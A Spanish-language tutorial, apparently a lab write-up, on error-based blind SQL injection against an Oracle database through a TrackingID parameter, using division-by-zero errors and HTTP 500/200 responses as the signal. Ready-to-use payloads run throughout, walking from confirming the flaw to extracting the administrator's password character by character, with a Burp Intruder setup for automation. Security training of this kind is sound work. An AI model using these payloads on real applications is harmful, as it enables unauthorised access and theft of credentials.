# **Blind SQL Injection con Código de Estado (Errores Condicionales) en OracleDB**

Este ataque de Blind SQL Injection aprovecha la diferencia en los códigos de estado HTTP generados por la aplicación cuando se produce un error en la base de datos. Específicamente, provocamos errores intencionales (por ejemplo, división por cero) para inferir información sobre la base de datos y sus contenidos.  

El flujo del ataque sigue estos pasos:

1. **Confirmar la vulnerabilidad**  
2. **Identificar el motor de base de datos**  
3. **Determinar si la tabla "users" existe**  
4. **Confirmar la existencia del usuario "administrator"**  
5. **Descubrir la longitud de la contraseña**  
6. **Extraer la contraseña carácter por carácter**  

---

## **1. Confirmar la Vulnerabilidad en TrackingID**

Se detecta que la aplicación usa el parámetro `TrackingID`, probablemente en una consulta SQL similar a esta:

```sql
SELECT * FROM products WHERE trackingid = 'input'
```

Para comprobar si la entrada es vulnerable, se inyectan comillas simples:

- **Prueba 1:**  
  ```
  TrackingID=xyz'
  ```
  - **Respuesta:** HTTP **500 Internal Server Error**  
  - **Explicación:** Se rompe la sintaxis SQL al agregar una comilla simple extra, lo que indica una posible vulnerabilidad de SQL Injection.

- **Prueba 2:**  
  ```
  TrackingID=xyz''
  ```
  - **Respuesta:** HTTP **200 OK**  
  - **Explicación:** Al agregar dos comillas (`''`), se cierra correctamente la cadena en SQL y no se genera error, confirmando que la entrada se está usando en una consulta SQL sin validación adecuada.

---

## **2. Identificar el Motor de Base de Datos**

Para determinar qué sistema de base de datos está en uso, se utilizan concatenaciones específicas que pueden variar según el SGBD.  

- **Prueba 1:**  
  ```sql
  TrackingID=xyz'||(select '')||'
  ```
  - **Respuesta:** HTTP **500 Internal Server Error**  
  - **Explicación:** Esta sintaxis no es válida en todos los motores de base de datos.

- **Prueba 2 (Oracle específico):**  
  ```sql
  TrackingID=xyz'||(select '' from dual)||'
  ```
  - **Respuesta:** HTTP **200 OK**  
  - **Explicación:** En Oracle, toda consulta `SELECT` requiere una tabla, y la tabla especial `dual` permite hacer consultas sin depender de una tabla real. Si este payload funciona, la base de datos es **Oracle**.

- **Prueba 3 (Tabla aleatoria inexistente):**  
  ```sql
  TrackingID=xyz'||(select '' from randomdb)||'
  ```
  - **Respuesta:** HTTP **500 Internal Server Error**  
  - **Explicación:** Se genera un error porque la tabla `randomdb` no existe.

**Conclusión:**  
El uso exitoso de `dual` confirma que la base de datos es **OracleDB**.

---

## **3. Determinar si la Tabla "users" Existe**

Para verificar si la tabla `users` existe, se intenta ejecutar una consulta en ella:

- **Prueba 1 (Tabla válida):**  
  ```sql
  TrackingID=xyz'||(select '' from users where rownum=1)||'
  ```
  - **Respuesta:** HTTP **200 OK**  
  - **Explicación:** Si la tabla `users` existe, la consulta se ejecuta correctamente sin errores.

- **Prueba 2 (Tabla inexistente):**  
  ```sql
  TrackingID=xyz'||(select '' from usersXYZ where rownum=1)||'
  ```
  - **Respuesta:** HTTP **500 Internal Server Error**  
  - **Explicación:** Se genera un error porque `usersXYZ` no existe en la base de datos.

**Conclusión:**  
Si la consulta sobre `users` devuelve un **200 OK** y la consulta sobre `usersXYZ` devuelve un **500**, entonces la tabla `users` existe.

---

## **4. Comprobar si el Usuario "administrator" Existe**

Para comprobar si el usuario `administrator` existe en la tabla `users`, se usa una consulta condicional con un error intencional:

- **Prueba 1 (Usuario Existe):**  
  ```sql
  TrackingID=xyz'||(select case when (1=1) then to_char(1/0) else '' end from users where username = 'administrator')||'
  ```
  - **Respuesta:** HTTP **500 Internal Server Error**  
  - **Explicación:**  
    - La consulta filtra por `username='administrator'`.  
    - Si el usuario existe, el `CASE` se evalúa y ejecuta `TO_CHAR(1/0)`, lo que genera un error de división por cero.  
    - Este error provoca que la aplicación devuelva un **500**.

- **Prueba 2 (Usuario No Existe):**  
  ```sql
  TrackingID=xyz'||(select case when (1=1) then to_char(1/0) else '' end from users where username = 'administratorXYZ')||'
  ```
  - **Respuesta:** HTTP **200 OK**  
  - **Explicación:**  
    - Si el usuario no existe, el `WHERE` no encuentra registros.  
    - Como el `CASE` nunca se ejecuta, no se genera el error, y la aplicación devuelve un **200 OK**.

**Conclusión:**  
Si la consulta con `administrator` devuelve un **500**, significa que el usuario existe.

---

## **5. Determinar la Longitud de la Contraseña**

Para averiguar la longitud de la contraseña del usuario `administrator`, se prueba con condiciones de longitud crecientes:

- **Ejemplo para comprobar si la longitud es mayor que 19:**  
  ```sql
  TrackingID=xyz'||(select case when length(password) > 19 then to_char(1/0) else '' end from users where username='administrator')||'
  ```
  - **Respuesta:** HTTP **500 Internal Server Error**  
  - **Explicación:** Si `length(password) > 19` es verdadero, se ejecuta `TO_CHAR(1/0)`, generando un error.

- **Se repite aumentando el valor hasta encontrar el punto en que deja de generar error:**  
  - **Prueba con `> 20` → HTTP 200 OK**  
  - **Conclusión:** La contraseña tiene **20 caracteres**.

---

## **6. Extraer la Contraseña Carácter por Carácter**

Una vez determinada la longitud, se extrae cada carácter usando `SUBSTR`.  
Para cada posición, se prueba cada posible carácter (a–z, 0–9) hasta provocar un error (HTTP 500).

- **Ejemplo para extraer el primer carácter:**  
  ```sql
  TrackingID=xyz'||(select case when substr(password,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'
  ```
  - **Respuesta:** HTTP **500 Internal Server Error** → El primer carácter es `'a'`.
  - **Respuesta:** HTTP **200 OK** → No es `'a'`, se prueba `'b'`, `'c'`, etc.

Este proceso se repite para cada posición hasta reconstruir la contraseña completa.

**Automatización con Burp Suite:**  
- Se usa **Burp Intruder** en modo **Cluster Bomb**.  
- Payload 1: Número de carácter (1, 2, 3, …, 20).  
- Payload 2: Carácter posible (a-z, 0-9).  
- Se filtran respuestas con código **500**, lo que indica coincidencias.

---

# **Conclusión**

Este método de **Blind SQL Injection basado en errores condicionales** permite extraer información sensible sin necesidad de ver la salida directa de la consulta.  

Al utilizar errores de división por cero y analizar los códigos de estado HTTP (200 vs 500), logramos:

✔️ Confirmar la vulnerabilidad  
✔️ Identificar Oracle como motor de base de datos  
✔️ Verificar la existencia de tablas y usuarios  
✔️ Determinar la longitud de la contraseña  
✔️ Extraer la contraseña carácter por carácter  

Este ataque es muy efectivo cuando la aplicación no muestra errores explícitos en la página, pero sí en los códigos de estado HTTP.
